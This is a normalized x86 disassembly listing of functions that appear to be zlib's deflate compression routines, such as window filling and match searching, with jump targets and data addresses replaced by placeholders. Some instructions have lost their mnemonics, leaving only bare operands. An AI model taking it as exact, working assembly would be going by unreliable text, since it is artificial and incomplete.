mov esi [ ecx + 0x10 ]
add esi edx
mov [ ecx + 0x10 ] esi
mov ebx [ eax + 0x14 ]
mov edi [ eax + 0x10 ]
mov ecx [ eax + 0x1c ]
add ebx edx
sub edi edx
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] edi
mov esi [ ecx + 0x14 ]
pop edi
sub esi edx
pop ebx
mov [ ecx + 0x14 ] esi
mov eax [ eax + 0x1c ]
mov ecx [ eax + 0x14 ]
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x8 ]
mov [ eax + 0x10 ] ecx
sub_4058d0
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
je r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov edi [ eax + 0x4 ]
cmp edi 0x2a
je r-xdata
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
cmp edi 0x71
je r-xdata
mov ecx [ esi + 0x1c ]
mov eax [ ecx + 0x3c ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0x28 ]
push eax
call [ esi + 0x24 ]
add esp 0x8
cmp edi 0x29a
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x38 ]
test eax eax
je r-xdata
mov edx [ esi + 0x28 ]
push eax
push edx
call [ esi + 0x24 ]
add esp 0x8
mov edx [ esi + 0x1c ]
mov eax [ edx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
add esp 0x8
mov ecx [ esi + 0x1c ]
mov edx [ esi + 0x28 ]
push ecx
push edx
call [ esi + 0x24 ]
add esp 0x8
xor eax eax
cmp edi 0x71
mov [ esi + 0x1c ] 0x0
setne al
dec eax
pop edi
and al 0xfd
pop esi
retn
push eax
mov eax [ esi + 0x28 ]
push eax
call [ esi + 0x24 ]
add esp 0x8
sub_405980
mov edx [ esp + 0x4 ]
push ebx
push esi
xor esi esi
mov eax [ edx + 0x24 ]
mov ecx [ edx + 0x44 ]
shl eax 0x1
mov [ edx + 0x34 ] eax
mov eax [ edx + 0x3c ]
push edi
mov [ eax + ecx * 2 - 0x2 ] si
mov ecx [ edx + 0x44 ]
mov edi [ edx + 0x3c ]
xor eax eax
lea ecx [ ecx + ecx - 0x2 ]
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov eax [ edx + 0x7c ]
xor ecx ecx
pop edi
lea eax [ eax + eax * 2 ]
shl eax 0x2
mov cx [ eax + r--data ]
mov [ edx + 0x78 ] ecx
xor ecx ecx
mov cx [ eax + r--data ]
mov [ edx + 0x84 ] ecx
xor ecx ecx
mov cx [ eax + r--data ]
mov [ edx + 0x88 ] ecx
xor ecx ecx
mov cx [ eax + r--data ]
mov [ edx + 0x64 ] esi
mov [ edx + 0x54 ] esi
mov [ edx + 0x6c ] esi
mov eax 0x2
mov [ edx + 0x60 ] esi
mov [ edx + 0x40 ] esi
pop esi
mov [ edx + 0x74 ] ecx
mov [ edx + 0x70 ] eax
mov [ edx + 0x58 ] eax
pop ebx
retn
sub_405a20
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov ebx 0xffff
mov eax [ esi + 0xc ]
add eax 0xfffffffb
cmp eax ebx
jae r-xdata
mov ebp [ esp + 0x14 ]
mov ebx eax
mov ecx [ esi + 0x64 ]
mov [ esi + 0x6c ] 0x0
add ecx eax
mov [ esi + 0x64 ] ecx
mov ecx [ esi + 0x54 ]
mov edx [ esi + 0x64 ]
lea eax [ ecx + ebx ]
je r-xdata
push esi
call sub_405b80
mov eax [ esi + 0x6c ]
add esp 0x4
test eax eax
jne r-xdata
sub edx eax
mov [ esi + 0x64 ] eax
test ecx ecx
mov [ esi + 0x6c ] edx
jl r-xdata
cmp edx eax
jb r-xdata
test ebp ebp
je r-xdata
xor edx edx
mov edx [ esi + 0x30 ]
add edx ecx
jmp r-xdata
mov ecx [ esi + 0x54 ]
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x24 ]
sub edx ecx
sub eax 0x106
cmp edx eax
jb r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
retn
test eax eax
je r-xdata
sub eax ecx
push 0x0
push eax
push edx
push esi
call sub_4079c0
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_405850
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x6c ]
cmp eax 0x1
ja r-xdata
test ecx ecx
jl r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax ecx
jmp r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax ecx
jmp r-xdata
jmp r-xdata
push 0x0
push edx
push eax
push esi
call sub_4079c0
mov edx [ esi ]
mov ecx [ esi + 0x64 ]
push edx
mov [ esi + 0x54 ] ecx
call sub_405850
mov eax [ esi ]
add esp 0x14
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov eax ebp
pop esi
sub eax 0x4
pop ebp
neg eax
sbb eax eax
pop ebx
and al 0xfe
add eax 0x3
retn
xor eax eax
cmp ebp 0x4
setne al
dec eax
pop esi
pop ebp
and eax 0x2
pop ebx
retn
xor edx edx
cmp ebp 0x4
sete dl
push edx
mov edx [ esi + 0x64 ]
sub edx ecx
push edx
push eax
push esi
call sub_4079c0
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_405850
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
sub_405b80
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov ebp [ ebx + 0x24 ]
push edi
cmp edx 0xffffffff
jne r-xdata
test eax eax
jne r-xdata
mov ecx [ ebx + 0x24 ]
lea ecx [ ecx + ebp - 0x106 ]
cmp eax ecx
jb r-xdata
mov edx 0xfffffffe
jmp r-xdata
test ecx ecx
jne r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov edi [ ebx + 0x30 ]
mov ecx ebp
mov eax ecx
lea esi [ edi + ebp ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebx + 0x68 ]
mov ecx [ ebx + 0x64 ]
mov eax [ ebx + 0x54 ]
sub esi ebp
sub ecx ebp
mov [ ebx + 0x68 ] esi
mov esi [ ebx + 0x44 ]
mov [ ebx + 0x64 ] ecx
mov ecx [ ebx + 0x3c ]
sub eax ebp
mov [ ebx + 0x54 ] eax
lea ecx [ ecx + esi * 2 ]
mov edx ebp
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ ebx + 0x6c ]
mov esi [ ebx + 0x64 ]
push edx
mov edx [ ebx + 0x30 ]
add ecx esi
add ecx edx
push ecx
push eax
call sub_405cb0
mov ecx [ ebx + 0x6c ]
add esp 0xc
add ecx eax
mov esi ecx
mov [ ebx + 0x6c ] ecx
cmp esi 0x3
jb r-xdata
xor eax eax
sub eax ebp
jmp r-xdata
cmp esi 0x106
jae r-xdata
mov edx [ ebx + 0x64 ]
mov eax [ ebx + 0x30 ]
mov ecx [ ebx + 0x50 ]
lea edi [ edx + eax ]
xor eax eax
mov al [ edi ]
mov [ ebx + 0x40 ] eax
shl eax cl
xor ecx ecx
mov cl [ edi + 0x1 ]
xor eax ecx
mov ecx [ ebx + 0x4c ]
and eax ecx
mov [ ebx + 0x40 ] eax
sub ecx 0x2
xor eax eax
mov ax [ ecx ]
cmp eax ebp
jb r-xdata
mov eax [ ebx + 0x38 ]
mov esi ebp
lea ecx [ eax + ebp * 2 ]
dec esi
mov [ ecx ] ax
jne r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x4 ]
test eax eax
jne r-xdata
xor eax eax
sub eax ebp
jmp r-xdata
mov eax [ ebx + 0x64 ]
mov edx [ ebx + 0x34 ]
mov ecx [ ebx + 0x6c ]
sub edx eax
sub edx ecx
jne r-xdata
sub ecx 0x2
xor eax eax
mov ax [ ecx ]
cmp eax ebp
jb r-xdata
add edx ebp
dec esi
mov [ ecx ] ax
jne r-xdata
sub_405cb0
mov ecx [ esp + 0xc ]
push ebx
push ebp
mov ebp [ esp + 0xc ]
mov eax [ ebp + 0x4 ]
mov ebx eax
cmp ebx ecx
jbe r-xdata
test ebx ebx
jne r-xdata
mov ebx ecx
sub eax ebx
mov [ ebp + 0x4 ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
pop ebp
xor eax eax
pop ebx
retn
mov ecx ebx
push esi
mov esi [ ebp ]
mov eax ecx
push edi
mov edi [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp ]
mov eax [ ebp + 0x8 ]
add ecx ebx
add eax ebx
pop edi
mov [ ebp ] ecx
mov [ ebp + 0x8 ] eax
pop esi
mov eax ebx
pop ebp
pop ebx
retn
mov ecx [ ebp ]
mov edx [ ebp + 0x30 ]
push ebx
push ecx
push edx
call sub_407470
add esp 0xc
mov [ ebp + 0x30 ] eax
sub_405d30
push ecx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
xor edi edi
cmp eax 0x3
jb r-xdata
push esi
call sub_405b80
mov eax [ esi + 0x6c ]
add esp 0x4
cmp eax 0x106
jae r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x50 ]
mov edx [ esi + 0x64 ]
mov edi [ esi + 0x30 ]
shl eax cl
xor ecx ecx
mov cl [ edi + edx + 0x2 ]
mov edi [ esi + 0x4c ]
xor eax ecx
mov ecx [ esi + 0x3c ]
and eax edi
xor edi edi
mov [ esi + 0x40 ] eax
mov di [ ecx + eax * 2 ]
mov eax [ esi + 0x2c ]
mov ecx [ esi + 0x38 ]
and eax edx
mov [ ecx + eax * 2 ] di
mov edx [ esi + 0x40 ]
mov eax [ esi + 0x3c ]
mov cx [ esi + 0x64 ]
mov [ eax + edx * 2 ] cx
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x58 ]
cmp eax 0x3
jb r-xdata
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x24 ]
sub edx edi
sub eax 0x106
cmp edx eax
ja r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebp
pop ecx
retn
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x1698 ]
mov al [ edx + eax ]
mov edx [ esi + 0x169c ]
mov [ esp + 0xc ] al
mov [ edx + ecx * 2 ] 0x0
mov ecx [ esi + 0x1690 ]
mov edx [ esi + 0x1698 ]
mov [ ecx + edx ] al
mov eax [ esp + 0xc ]
mov ebp [ esi + 0x1698 ]
and eax 0xff
inc ebp
xor edx edx
lea eax [ esi + eax * 4 + 0x8c ]
mov [ esi + 0x1698 ] ebp
inc [ eax ]
mov ecx [ esi + 0x1694 ]
mov ebp [ esi + 0x1698 ]
dec ecx
cmp ebp ecx
mov ecx [ esi + 0x6c ]
sete dl
dec ecx
mov ebp edx
mov [ esi + 0x6c ] ecx
mov edx [ esi + 0x1698 ]
mov ebp [ esi + 0x169c ]
mov cl al
mov ax [ esi + 0x64 ]
sub ax [ esi + 0x68 ]
sub cl 0x3
mov [ esp + 0x14 ] cl
mov [ ebp + edx * 2 ] ax
mov edx [ esi + 0x1690 ]
mov ebp [ esi + 0x1698 ]
add eax 0xffff
mov [ edx + ebp ] cl
mov edx [ esi + 0x1698 ]
mov ecx [ esp + 0x14 ]
inc edx
mov [ esi + 0x1698 ] edx
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
inc [ esi + edx * 4 + 0x490 ]
cmp ax 0x100
lea ecx [ esi + edx * 4 + 0x490 ]
jae r-xdata
cmp [ esi + 0x80 ] 0x2
je r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax ecx
jmp r-xdata
mov eax [ esi + 0x6c ]
cmp eax 0x106
jae r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
and eax 0xffff
shr eax 0x7
xor edx edx
mov dl [ eax + r--data ]
mov eax edx
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov eax ecx
jmp r-xdata
push edi
push esi
call sub_406060
add esp 0x8
mov [ esi + 0x58 ] eax
mov eax [ esp + 0x18 ]
pop edi
sub eax 0x4
pop esi
neg eax
sbb eax eax
pop ebp
and al 0xfe
add eax 0x3
pop ecx
retn
mov esi ebp
xor eax eax
cmp esi 0x4
pop edi
setne al
dec eax
pop esi
and eax 0x2
pop ebp
pop ecx
retn
mov ebp [ esp + 0x18 ]
xor edx edx
cmp ebp 0x4
sete dl
push edx
mov edx [ esi + 0x64 ]
sub edx ecx
push edx
push eax
push esi
call sub_4079c0
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_405850
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
xor eax eax
mov edx [ esi + 0x30 ]
mov eax ecx
add eax edx
jmp r-xdata
mov ecx [ esi + 0x64 ]
mov edx [ esi + 0x30 ]
add ecx eax
xor eax eax
add edx ecx
mov [ esi + 0x64 ] ecx
mov ecx [ esi + 0x50 ]
mov [ esi + 0x58 ] 0x0
mov al [ edx ]
mov [ esi + 0x40 ] eax
shl eax cl
xor ecx ecx
mov cl [ edx + 0x1 ]
xor eax ecx
mov ecx [ esi + 0x4c ]
and eax ecx
mov [ esi + 0x40 ] eax
jmp r-xdata
cmp ecx 0x3
jb r-xdata
inc [ esi + eax * 4 + 0x980 ]
mov eax [ esi + 0x1694 ]
mov edx [ esi + 0x1698 ]
dec eax
xor ecx ecx
cmp edx eax
mov eax [ esi + 0x58 ]
mov edx [ esi + 0x78 ]
sete cl
mov ebp ecx
mov ecx [ esi + 0x6c ]
sub ecx eax
cmp eax edx
mov [ esi + 0x6c ] ecx
ja r-xdata
jmp r-xdata
mov edx [ esi + 0x64 ]
push 0x0
sub edx ecx
push edx
push eax
push esi
call sub_4079c0
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_405850
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
test ebp ebp
je r-xdata
dec eax
mov [ esi + 0x58 ] eax
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x30 ]
mov edi [ esi + 0x40 ]
inc edx
xor ecx ecx
mov [ esi + 0x64 ] edx
mov cl [ edx + eax + 0x2 ]
mov eax ecx
mov ecx [ esi + 0x50 ]
shl edi cl
mov ecx [ esi + 0x3c ]
xor eax edi
mov edi [ esi + 0x4c ]
and eax edi
xor edi edi
mov [ esi + 0x40 ] eax
mov di [ ecx + eax * 2 ]
mov ecx [ esi + 0x2c ]
mov eax [ esi + 0x38 ]
and edx ecx
mov [ eax + edx * 2 ] di
mov ecx [ esi + 0x40 ]
mov edx [ esi + 0x3c ]
mov ax [ esi + 0x64 ]
mov [ edx + ecx * 2 ] ax
mov eax [ esi + 0x58 ]
dec eax
mov [ esi + 0x58 ] eax
jne r-xdata
jmp r-xdata
inc [ esi + 0x64 ]
sub_406060
sub esp 0x14
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x28 ]
mov esi [ edi + 0x24 ]
mov eax [ edi + 0x74 ]
mov edx [ edi + 0x64 ]
mov ecx [ edi + 0x30 ]
mov ebp [ edi + 0x70 ]
mov [ esp + 0x14 ] eax
mov eax [ edi + 0x88 ]
lea ebx [ esi - 0x106 ]
add ecx edx
cmp edx ebx
mov [ esp + 0x18 ] eax
jbe r-xdata
mov [ esp + 0x1c ] 0x0
sub edx esi
add edx 0x106
mov [ esp + 0x1c ] edx
jmp r-xdata
mov edx [ edi + 0x6c ]
cmp eax edx
mov [ esp + 0x20 ] edx
jbe r-xdata
shr [ esp + 0x14 ] 0x2
mov dl [ ecx + ebp - 0x1 ]
lea ebx [ ecx + 0x102 ]
mov [ esp + 0x28 ] dl
mov dl [ ecx + ebp ]
mov [ esp + 0x13 ] dl
mov edx [ edi + 0x84 ]
cmp ebp edx
jb r-xdata
mov esi [ esp + 0x2c ]
mov [ esp + 0x18 ] edx
mov edx [ edi + 0x2c ]
mov eax [ edi + 0x38 ]
and edx esi
xor esi esi
mov si [ eax + edx * 2 ]
mov eax [ esp + 0x1c ]
cmp esi eax
jbe r-xdata
mov al [ esp + 0x28 ]
cmp [ edx + ebp - 0x1 ] al
jne r-xdata
mov eax [ esp + 0x20 ]
cmp ebp eax
ja r-xdata
mov eax [ esp + 0x14 ]
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov al [ edx ]
cmp al [ ecx ]
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov eax ebp
mov edx [ edi + 0x30 ]
mov al [ esp + 0x13 ]
add edx esi
cmp [ edx + ebp ] al
jne r-xdata
mov al [ edx + 0x1 ]
inc edx
cmp al [ ecx + 0x1 ]
jne r-xdata
add ecx 0x2
inc edx
mov edx ecx
lea ecx [ ebx - 0x102 ]
sub edx ebx
add edx 0x102
cmp edx ebp
jle r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov eax [ esp + 0x18 ]
mov [ edi + 0x68 ] esi
cmp edx eax
mov ebp edx
jge r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ edx + ecx - 0x1 ]
mov dl [ edx + ecx ]
mov [ esp + 0x28 ] al
mov [ esp + 0x13 ] dl
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
cmp ecx ebx
jb r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
sub_4061d0
push ecx
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
xor edi edi
mov ebp 0x2
cmp eax 0x3
jb r-xdata
push esi
call sub_405b80
mov eax [ esi + 0x6c ]
mov ebx [ esp + 0x20 ]
add esp 0x4
cmp eax 0x106
jae r-xdata
mov edx [ esi + 0x58 ]
mov eax [ esi + 0x68 ]
test edi edi
mov [ esi + 0x70 ] edx
mov [ esi + 0x5c ] eax
mov [ esi + 0x58 ] ebp
je r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x50 ]
mov edx [ esi + 0x64 ]
mov edi [ esi + 0x4c ]
shl eax cl
mov ecx [ esi + 0x30 ]
xor ebx ebx
mov bl [ ecx + edx + 0x2 ]
mov ecx [ esi + 0x3c ]
xor eax ebx
and eax edi
xor edi edi
mov [ esi + 0x40 ] eax
mov di [ ecx + eax * 2 ]
mov eax [ esi + 0x2c ]
mov ecx [ esi + 0x38 ]
and eax edx
mov [ ecx + eax * 2 ] di
mov edx [ esi + 0x40 ]
mov eax [ esi + 0x3c ]
mov cx [ esi + 0x64 ]
mov [ eax + edx * 2 ] cx
test eax eax
je r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x70 ]
cmp eax 0x3
jb r-xdata
mov eax [ esi + 0x78 ]
mov ecx edx
cmp ecx eax
jae r-xdata
mov eax [ esi + 0x60 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ esi + 0x60 ]
test eax eax
je r-xdata
cmp [ esi + 0x58 ] eax
ja r-xdata
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x24 ]
sub edx edi
sub eax 0x106
cmp edx eax
ja r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
mov eax [ esi + 0x64 ]
mov ecx [ esi + 0x30 ]
mov edx [ esi + 0x1698 ]
mov al [ eax + ecx - 0x1 ]
mov ecx [ esi + 0x169c ]
mov [ esp + 0x1c ] al
mov [ ecx + edx * 2 ] 0x0
mov edx [ esi + 0x1690 ]
mov ecx [ esi + 0x1698 ]
mov [ edx + ecx ] al
mov eax [ esi + 0x1698 ]
mov edx [ esp + 0x1c ]
inc eax
and edx 0xff
mov [ esi + 0x1698 ] eax
inc [ esi + edx * 4 + 0x8c ]
mov [ esi + 0x60 ] 0x0
lea eax [ esi + edx * 4 + 0x8c ]
mov ecx [ esi + 0x64 ]
mov eax [ esi + 0x6c ]
inc ecx
dec eax
mov [ esi + 0x60 ] 0x1
mov [ esi + 0x64 ] ecx
mov [ esi + 0x6c ] eax
jmp r-xdata
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x1698 ]
mov al [ edx + eax - 0x1 ]
mov edx [ esi + 0x169c ]
mov [ esp + 0x10 ] al
mov [ edx + ecx * 2 ] 0x0
mov ecx [ esi + 0x1690 ]
mov edx [ esi + 0x1698 ]
mov [ ecx + edx ] al
mov eax [ esp + 0x10 ]
mov edx [ esi + 0x1698 ]
and eax 0xff
inc edx
lea eax [ esi + eax * 4 + 0x8c ]
mov [ esi + 0x1698 ] edx
inc [ eax ]
mov ecx [ esi + 0x1694 ]
mov eax [ esi + 0x1698 ]
dec ecx
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x6c ]
mov cl [ esi + 0x70 ]
mov ebx [ esi + 0x169c ]
lea ebp [ edx + eax - 0x3 ]
mov ax dx
sub ax [ esi + 0x5c ]
mov edx [ esi + 0x1698 ]
sub cl 0x3
dec eax
mov [ esp + 0x18 ] cl
mov [ ebx + edx * 2 ] ax
mov edx [ esi + 0x1690 ]
mov ebx [ esi + 0x1698 ]
add eax 0xffff
mov [ edx + ebx ] cl
mov edx [ esi + 0x1698 ]
mov ecx [ esp + 0x18 ]
inc edx
mov [ esi + 0x1698 ] edx
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
inc [ esi + edx * 4 + 0x490 ]
cmp ax 0x100
lea ecx [ esi + edx * 4 + 0x490 ]
jae r-xdata
cmp [ esi + 0x80 ] ebp
je r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax ecx
jmp r-xdata
mov eax [ esi + 0x6c ]
cmp eax 0x106
jae r-xdata
mov edx [ esi + 0x64 ]
mov ecx [ esi + 0x6c ]
inc edx
dec ecx
mov [ esi + 0x64 ] edx
mov edx [ esi ]
mov [ esi + 0x6c ] ecx
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
and eax 0xffff
shr eax 0x7
xor edx edx
mov dl [ eax + r--data ]
mov eax edx
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov eax ecx
jmp r-xdata
mov eax [ esi + 0x58 ]
cmp eax 0x5
ja r-xdata
push edi
push esi
call sub_406060
add esp 0x8
mov [ esi + 0x58 ] eax
mov eax ebx
pop edi
sub eax 0x4
pop esi
neg eax
sbb eax eax
pop ebp
and al 0xfe
pop ebx
add eax 0x3
pop ecx
retn
xor eax eax
cmp ebx 0x4
setne al
dec eax
pop edi
and eax ebp
pop esi
pop ebp
pop ebx
pop ecx
retn
xor edx edx
cmp ebx 0x4
sete dl
push edx
mov edx [ esi + 0x64 ]
sub edx ecx
push edx
push eax
push esi
call sub_4079c0
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_405850
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
jmp r-xdata
xor eax eax
mov edx [ esi + 0x30 ]
mov eax ecx
add eax edx
jmp r-xdata
mov eax [ esi + 0x70 ]
dec eax
mov [ esi + 0x70 ] eax
jne r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x50 ]
mov edi [ esi + 0x30 ]
shl eax cl
xor ecx ecx
mov cl [ edi + edx + 0x2 ]
mov edi [ esi + 0x4c ]
xor eax ecx
mov ecx [ esi + 0x3c ]
and eax edi
xor edi edi
mov [ esi + 0x40 ] eax
mov di [ ecx + eax * 2 ]
mov eax [ esi + 0x2c ]
mov ecx [ esi + 0x38 ]
and eax edx
mov [ ecx + eax * 2 ] di
mov edx [ esi + 0x40 ]
mov eax [ esi + 0x3c ]
mov cx [ esi + 0x64 ]
mov [ eax + edx * 2 ] cx
inc [ esi + eax * 4 + 0x980 ]
mov eax [ esi + 0x1694 ]
mov ecx [ esi + 0x1698 ]
mov edx [ esi + 0x6c ]
dec eax
xor ebx ebx
cmp ecx eax
mov eax [ esi + 0x70 ]
mov ecx 0x1
sete bl
sub ecx eax
add edx ecx
add eax 0xfffffffe
mov [ esi + 0x6c ] edx
mov [ esi + 0x70 ] eax
cmp [ esi + 0x80 ] 0x1
je r-xdata
mov edx [ esi + 0x64 ]
push 0x0
sub edx ecx
push edx
push eax
push esi
call sub_4079c0
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_405850
add esp 0x14
mov ecx [ esi + 0x64 ]
inc ecx
mov edx ecx
mov [ esi + 0x64 ] ecx
cmp edx ebp
ja r-xdata
mov ecx [ esi + 0x64 ]
mov ebp 0x2
inc ecx
mov [ esi + 0x60 ] 0x0
test ebx ebx
mov [ esi + 0x58 ] ebp
mov [ esi + 0x64 ] ecx
je r-xdata
mov [ esi + 0x58 ] ebp
cmp eax 0x3
jne r-xdata
mov edx [ esi + 0x54 ]
test edx edx
jl r-xdata
mov ecx [ esi + 0x64 ]
mov edx [ esi + 0x68 ]
sub ecx edx
cmp ecx 0x1000
jbe r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax edx
jmp r-xdata
jmp r-xdata
sub ecx edx
push 0x0
push ecx
push eax
push esi
call sub_4079c0
mov eax [ esi ]
mov edx [ esi + 0x64 ]
push eax
mov [ esi + 0x54 ] edx
call sub_405850
mov ecx [ esi ]
add esp 0x14
mov eax [ ecx + 0x10 ]
test eax eax
je r-xdata
sub_406600
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push edi
test eax eax
je r-xdata
mov eax [ esi ]
mov edi [ esp + 0x10 ]
cmp eax 0x4
je r-xdata
mov ecx [ esi + 0x3c ]
mov [ eax ] ecx
mov edx [ esi + 0xc ]
mov eax [ edi + 0x28 ]
push edx
push eax
call [ edi + 0x24 ]
add esp 0x8
cmp eax 0x5
jne r-xdata
mov eax [ esi + 0x28 ]
mov [ esi ] 0x0
mov [ esi + 0x34 ] eax
mov [ esi + 0x30 ] eax
mov eax [ esi + 0x38 ]
mov [ esi + 0x1c ] 0x0
test eax eax
mov [ esi + 0x20 ] 0x0
je r-xdata
mov ecx [ esi + 0x4 ]
push edi
push ecx
call sub_409950
add esp 0x8
cmp [ esi ] 0x6
jne r-xdata
pop edi
pop esi
retn
push 0x0
push 0x0
push 0x0
call eax
mov [ esi + 0x3c ] eax
add esp 0xc
mov [ edi + 0x30 ] eax
sub_406680
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
push 0x40
push 0x1
mov eax [ edi + 0x28 ]
push eax
call [ edi + 0x20 ]
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ecx [ edi + 0x28 ]
push 0x5a0
push 0x8
push ecx
call [ edi + 0x20 ]
add esp 0xc
mov [ esi + 0x24 ] eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0x18 ]
mov eax [ edi + 0x28 ]
push ebx
push 0x1
push eax
call [ edi + 0x20 ]
add esp 0xc
mov [ esi + 0x28 ] eax
test eax eax
jne r-xdata
mov edx [ edi + 0x28 ]
push esi
push edx
call [ edi + 0x24 ]
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0x14 ]
push 0x0
add eax ebx
push edi
push esi
mov [ esi + 0x2c ] eax
mov [ esi + 0x38 ] ecx
mov [ esi ] 0x0
call sub_406600
add esp 0xc
mov eax esi
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0x24 ]
mov edx [ edi + 0x28 ]
push ecx
push edx
call [ edi + 0x24 ]
mov eax [ edi + 0x28 ]
push esi
push eax
call [ edi + 0x24 ]
add esp 0x10
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_406720
sub esp 0x30
mov eax [ esp + 0x38 ]
push ebx
mov ebx [ esp + 0x38 ]
push ebp
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0x20 ]
mov ebp [ ebx + 0x1c ]
mov [ esp + 0x8 ] ecx
mov ecx [ ebx + 0x34 ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x30 ]
push esi
cmp ecx eax
push edi
mov [ esp + 0x14 ] edx
mov [ esp + 0x44 ] ecx
jae r-xdata
mov eax [ ebx + 0x2c ]
sub eax ecx
sub eax ecx
dec eax
jmp r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] ecx
